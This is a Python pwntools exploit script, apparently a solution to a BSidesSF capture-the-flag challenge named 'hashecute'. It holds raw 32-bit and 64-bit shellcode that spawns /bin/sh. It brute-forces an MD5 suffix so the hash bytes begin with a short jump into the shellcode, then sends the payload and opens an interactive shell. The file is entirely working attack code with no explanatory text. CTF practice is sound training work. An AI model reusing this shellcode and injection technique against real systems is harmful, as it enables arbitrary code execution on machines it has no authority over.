from pwn import *
import base64
import re
import hashlib

#conn = remote('hashecute-9b16b5b9.ctf.bsidessf.net', 2525)
conn = process("./hashecute")

#32bit
#shell = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

#64bit
shell ="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

count = 0
while 1:
    shell_a = shell+str(count)
    m = hashlib.md5()
    m.update(shell_a)
    hash = m.digest()
    #print hash.encode("hex")[0:4]
    if hash.encode("hex")[0:4] == "eb10":
        break
    count +=1

asm =""

for i in m.digest():
    asm += hex(ord(i)).replace("0x","\\x")

print asm

send_line = hash+shell_a

line =conn.recvuntil("Send me stuff!!\n")
print line
log.info("[+]send this line: "+send_line)
conn.send(send_line)

conn.interactive()

